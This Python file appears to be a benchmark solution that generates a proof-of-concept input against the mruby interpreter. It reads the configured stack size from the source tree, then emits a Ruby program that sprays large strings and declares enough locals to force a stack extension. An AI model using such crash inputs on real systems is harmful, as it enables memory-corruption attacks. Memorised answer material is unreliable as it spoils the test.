import os
import re
import tarfile
import ast
from typing import Optional, Iterable, Tuple, List


_RUBY_KEYWORDS = {
    "BEGIN", "END",
    "__ENCODING__", "__FILE__", "__LINE__",
    "alias", "and", "begin", "break", "case", "class", "def", "defined?",
    "do", "else", "elsif", "end", "ensure", "false", "for", "if", "in",
    "module", "next", "nil", "not", "or", "redo", "rescue", "retry",
    "return", "self", "super", "then", "true", "undef", "unless", "until",
    "when", "while", "yield",
}


def _safe_eval_int(expr: str) -> Optional[int]:
    if not expr:
        return None
    expr = expr.strip()
    expr = re.split(r"//|/\*", expr, maxsplit=1)[0].strip()
    expr = re.sub(r"(?<=\d)[uUlL]+\b", "", expr)
    expr = re.sub(r"\bsizeof\s*\([^)]*\)", "0", expr)
    # Drop common C casts: (type) or (type*) prefix
    expr = re.sub(r"^\(\s*[A-Za-z_][A-Za-z0-9_\s\*]*\s*\)\s*", "", expr)
    if not expr:
        return None

    # Fast path: if just a number (possibly in parentheses)
    m = re.fullmatch(r"\(?\s*(0x[0-9a-fA-F]+|\d+)\s*\)?", expr)
    if m:
        try:
            return int(m.group(1), 0)
        except Exception:
            return None

    try:
        node = ast.parse(expr, mode="eval")
    except Exception:
        nums = re.findall(r"0x[0-9a-fA-F]+|\d+", expr)
        if nums:
            try:
                return int(nums[0], 0)
            except Exception:
                return None
        return None

    def ev(n) -> int:
        if isinstance(n, ast.Expression):
            return ev(n.body)
        if isinstance(n, ast.Constant) and isinstance(n.value, int):
            return int(n.value)
        if isinstance(n, ast.UnaryOp) and isinstance(n.op, (ast.UAdd, ast.USub, ast.Invert)):
            v = ev(n.operand)
            if isinstance(n.op, ast.UAdd):
                return v
            if isinstance(n.op, ast.USub):
                return -v
            return ~v
        if isinstance(n, ast.BinOp) and isinstance(n.op, (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Mod, ast.LShift, ast.RShift, ast.BitOr, ast.BitAnd, ast.BitXor)):
            a = ev(n.left)
            b = ev(n.right)
            if isinstance(n.op, ast.Add):
                return a + b
            if isinstance(n.op, ast.Sub):
                return a - b
            if isinstance(n.op, ast.Mult):
                return a * b
            if isinstance(n.op, ast.FloorDiv):
                return a // b
            if isinstance(n.op, ast.Mod):
                return a % b
            if isinstance(n.op, ast.LShift):
                return a << b
            if isinstance(n.op, ast.RShift):
                return a >> b
            if isinstance(n.op, ast.BitOr):
                return a | b
            if isinstance(n.op, ast.BitAnd):
                return a & b
            if isinstance(n.op, ast.BitXor):
                return a ^ b
        raise ValueError("unsupported expression")

    try:
        return int(ev(node))
    except Exception:
        nums = re.findall(r"0x[0-9a-fA-F]+|\d+", expr)
        if nums:
            try:
                return int(nums[0], 0)
            except Exception:
                return None
        return None


def _extract_define_from_text(text: str, name: str) -> Optional[int]:
    rx = re.compile(r"^\s*#\s*define\s+" + re.escape(name) + r"\s+(.+?)\s*$", re.M)
    for m in rx.finditer(text):
        expr = m.group(1).strip()
        val = _safe_eval_int(expr)
        if val is not None:
            return val
    return None


def _read_text_file(path: str, limit: int = 2_000_000) -> Optional[str]:
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
        return data.decode("utf-8", "ignore")
    except Exception:
        return None


def _iter_candidate_texts_dir(root: str) -> Iterable[Tuple[str, str]]:
    preferred_subs = [
        os.path.join("include", "mruby", "config.h"),
        os.path.join("include", "mruby", "conf.h"),
        os.path.join("include", "mruby.h"),
        os.path.join("src", "vm.c"),
    ]
    seen = set()
    for sub in preferred_subs:
        p = os.path.join(root, sub)
        if os.path.isfile(p):
            t = _read_text_file(p)
            if t is not None:
                seen.add(os.path.abspath(p))
                yield p, t

    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if not (fn.endswith((".h", ".c", ".hpp", ".cc"))):
                continue
            p = os.path.join(dirpath, fn)
            ap = os.path.abspath(p)
            if ap in seen:
                continue
            t = _read_text_file(p)
            if t is None:
                continue
            yield p, t


def _tar_member_to_text(tar: tarfile.TarFile, member: tarfile.TarInfo, limit: int = 2_000_000) -> Optional[str]:
    try:
        f = tar.extractfile(member)
        if f is None:
            return None
        data = f.read(limit)
        return data.decode("utf-8", "ignore")
    except Exception:
        return None


def _iter_candidate_texts_tar(tar: tarfile.TarFile) -> Iterable[Tuple[str, str]]:
    members = [m for m in tar.getmembers() if m.isfile()]
    preferred_names = [
        "include/mruby/config.h",
        "include/mruby/conf.h",
        "include/mruby.h",
        "src/vm.c",
    ]

    name_to_member = {}
    for m in members:
        name_to_member[m.name] = m
        bn = m.name
        if "/" in bn:
            bn = bn.split("/", 1)[1]
            if bn not in name_to_member:
                name_to_member[bn] = m

    yielded = set()
    for pn in preferred_names:
        m = name_to_member.get(pn)
        if m is None:
            for k, mm in name_to_member.items():
                if k.endswith(pn):
                    m = mm
                    break
        if m is not None:
            t = _tar_member_to_text(tar, m)
            if t is not None:
                yielded.add(m.name)
                yield m.name, t

    for m in members:
        if m.name in yielded:
            continue
        n = m.name.lower()
        if not (n.endswith((".h", ".c", ".hpp", ".cc"))):
            continue
        t = _tar_member_to_text(tar, m)
        if t is None:
            continue
        yield m.name, t


def _find_define(src_path: str, name: str) -> Optional[int]:
    if os.path.isdir(src_path):
        for _, text in _iter_candidate_texts_dir(src_path):
            val = _extract_define_from_text(text, name)
            if val is not None:
                return val
        return None

    if os.path.isfile(src_path):
        try:
            with tarfile.open(src_path, "r:*") as tar:
                for _, text in _iter_candidate_texts_tar(tar):
                    val = _extract_define_from_text(text, name)
                    if val is not None:
                        return val
        except Exception:
            return None
    return None


_BASE62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
_FIRST = "abcdefghijklmnopqrstuvwxyz"


def _suffixes_of_len(k: int) -> List[str]:
    if k <= 0:
        return [""]
    if k == 1:
        return list(_BASE62)
    out = [""]
    for _ in range(k):
        out = [p + c for p in out for c in _BASE62]
    return out


def _generate_local_names(n: int) -> List[str]:
    names: List[str] = []
    for ch in _FIRST:
        if ch in _RUBY_KEYWORDS:
            continue
        names.append(ch)
        if len(names) >= n:
            return names

    length = 2
    while len(names) < n:
        suf_len = length - 1
        if suf_len > 3:
            # Fallback to numeric names to avoid massive precompute
            i = 0
            while len(names) < n:
                nm = "v" + str(i)
                if nm not in _RUBY_KEYWORDS:
                    names.append(nm)
                i += 1
            return names

        sufs = _suffixes_of_len(suf_len)
        for first in _FIRST:
            for suf in sufs:
                nm = first + suf
                if nm in _RUBY_KEYWORDS:
                    continue
                names.append(nm)
                if len(names) >= n:
                    return names
        length += 1
    return names


class Solution:
    def solve(self, src_path: str) -> bytes:
        stack_init = _find_define(src_path, "MRB_STACK_INIT_SIZE")
        if stack_init is None or stack_init <= 0:
            stack_init = 1024

        # Aim just above initial stack to force mrb_stack_extend in a call
        locals_count = stack_init + 32
        if locals_count < 256:
            locals_count = 256
        if locals_count > 10000:
            locals_count = 10000

        local_names = _generate_local_names(locals_count)
        assigns = "".join(nm + "=0;" for nm in local_names)

        pre = "b='A'*2000000;c='B'*2000000;a=[];i=0;while i<200;a<<'Z'*1000;i+=1;end;"
        code = pre + "class C;def f;" + assigns + "0;end;end;C.new.f\n"
        return code.encode("utf-8")